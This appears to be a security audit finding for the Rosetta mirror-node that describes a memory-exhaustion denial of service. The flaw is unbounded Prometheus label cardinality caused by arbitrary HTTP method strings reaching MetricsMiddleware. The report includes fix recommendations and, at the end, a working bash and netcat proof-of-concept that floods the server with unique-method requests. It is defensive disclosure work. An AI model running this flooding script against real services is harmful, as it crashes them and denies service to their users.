### Title
Unbounded Prometheus Label Cardinality via Arbitrary HTTP Methods in MetricsMiddleware Causes Memory Exhaustion DoS

### Summary
`MetricsMiddleware` in `rosetta/app/middleware/metrics.go` delegates instrumentation to `weaveworks/common/middleware.Instrument`, which records the raw `r.Method` string directly as a Prometheus label value without any allowlist or sanitization. Go's `net/http` server accepts arbitrary HTTP method tokens, so an unauthenticated attacker can flood the server with requests bearing unique method strings, creating an unbounded number of Prometheus time-series label combinations that exhaust process memory and crash the server.

### Finding Description

**Exact code path:**

`rosetta/app/middleware/metrics.go`, lines 76–83:

```go
func MetricsMiddleware(next http.Handler) http.Handler {
    return middleware.Instrument{
        Duration:         requestDurationHistogram,
        InflightRequests: requestInflightGauge,
        RequestBodySize:  requestBytesHistogram,
        ResponseBodySize: responseBytesHistogram,
        RouteMatcher:     next.(middleware.RouteMatcher),
    }.Wrap(next)
}
```

The four `*Vec` metrics are declared with a `"method"` label dimension (lines 22–43):

```go
requestBytesHistogram = prometheus.NewHistogramVec(..., []string{"method", "route"})
requestInflightGauge  = prometheus.NewGaugeVec(...,   []string{"method", "route"})
```

**Root cause:** `weaveworks/common/middleware.Instrument.Wrap()` extracts the HTTP method from `r.Method` and passes it verbatim as the `method` label value when calling `With(prometheus.Labels{...})` on each `*Vec`. Go's `net/http` server imposes no restriction on the method token beyond RFC 7230 token syntax (printable ASCII, no whitespace/control chars), so `AAAA1`, `AAAA2`, … `AAAAn` are all valid and distinct method strings that the server will accept and forward to the middleware.

**Failed assumption:** The code assumes the `method` label has bounded cardinality (i.e., only standard HTTP verbs like `GET`, `POST`, etc. will appear). There is no allowlist, no normalization, and no cap on distinct label values.

**Exploit flow:**
1. Attacker sends sequential HTTP/1.1 requests, each with a unique method token: `M00000001 /network/list HTTP/1.1`, `M00000002 /network/list HTTP/1.1`, …
2. `MetricsMiddleware` fires before routing; `requestInflightGauge.With({"method":"M00000001","route":...}).Inc()` is called.
3. Prometheus allocates a new internal `metricWithLabelValues` entry in the `HistogramVec`/`GaugeVec` sync.Map for each unique label combination.
4. Each unique method × route pair creates ~23 new time-series objects (5 histogram buckets + sum + count for each of the two histograms, plus gauge entries).
5. After millions of unique methods the Go heap is exhausted; the process is killed by the OOM killer or panics.

**Why existing checks are insufficient:**
- `main.go` lines 220–227 configure `ReadHeaderTimeout`, `ReadTimeout`, `IdleTimeout`, and `WriteTimeout` — none of these limit the number of distinct HTTP methods or the cardinality of Prometheus labels.
- There is no rate-limiting middleware, no connection-count cap, and no HTTP method allowlist anywhere in the rosetta middleware chain (`MetricsMiddleware` → `TracingMiddleware` → `CorsMiddleware`).
- The Rosetta router (coinbase/rosetta-sdk-go + gorilla/mux) will return `405 Method Not Allowed` for unrecognised methods, but the weaveworks `Instrument` wrapper records the metric *before* the response is written, so the label is persisted regardless of the HTTP status code.

### Impact Explanation
A successful attack crashes the Rosetta mirror-node process. In the context of staking reward distribution, the Rosetta API is the interface through which reward-claiming transactions are constructed and submitted (`/construction/payloads`, `/construction/submit`). A crashed server halts all pending reward-claim operations, causing denial of service to stakers. Because Prometheus `*Vec` objects hold references in a `sync.Map` that is never garbage-collected during the process lifetime, memory is permanently consumed until OOM; a restart restores service but the attacker can immediately repeat the attack.

### Likelihood Explanation
The attack requires no authentication, no special privileges, and no knowledge of the application beyond the fact that it listens on an HTTP port. The only tooling needed is a script that sends HTTP requests with incrementing method strings (trivially done with `curl`, `netcat`, or any HTTP library). The attack is repeatable across restarts. The Rosetta port is typically exposed to the internet or at minimum to the internal network where many actors have access.

### Recommendation
1. **Normalize the method label** before it reaches Prometheus. Wrap `MetricsMiddleware` with a thin handler that replaces `r.Method` with a sanitized value:
   ```go
   allowed := map[string]bool{"GET": true, "POST": true, "OPTIONS": true, "HEAD": true}
   method := r.Method
   if !allowed[method] {
       method = "UNKNOWN"
   }
   ```
   Then pass the sanitized method to the metrics, or use a custom `Instrument` wrapper instead of the weaveworks one.

2. **Use a fixed-cardinality label** by replacing the raw method with a normalized string (e.g., map all non-standard methods to `"OTHER"`).

3. **Add a rate-limiting middleware** (e.g., `golang.org/x/time/rate`) before `MetricsMiddleware` to bound the request rate per IP, limiting the speed at which new label combinations can be created.

4. **Set `MaxHeaderBytes`** on the `http.Server` and consider adding a connection-count limiter to reduce the attack surface.

### Proof of Concept

```bash
#!/usr/bin/env bash
# Sends 100,000 requests with unique HTTP methods to exhaust Prometheus label memory.
# Requires: bash, nc (netcat) or curl with --request flag (curl ignores unknown methods,
# so use netcat for raw HTTP/1.1).

HOST=127.0.0.1
PORT=8082   # default rosetta port

for i in $(seq 1 100000); do
  METHOD="METH$(printf '%06d' $i)"
  printf "%s /network/list HTTP/1.1\r\nHost: %s\r\nContent-Length: 0\r\nConnection: close\r\n\r\n" \
    "$METHOD" "$HOST" | nc -q1 "$HOST" "$PORT" > /dev/null 2>&1 &
  # throttle to avoid local fd exhaustion
  [ $((i % 500)) -eq 0 ] && wait
done
wait
echo "Done. Monitor rosetta process RSS — expect OOM or crash."
```

Each iteration registers a new `method` label value in all four `*Vec` Prometheus metrics. After sufficient iterations the Go heap is exhausted and the server process terminates, denying service to all staking-reward operations. [1](#0-0) [2](#0-1) [3](#0-2)
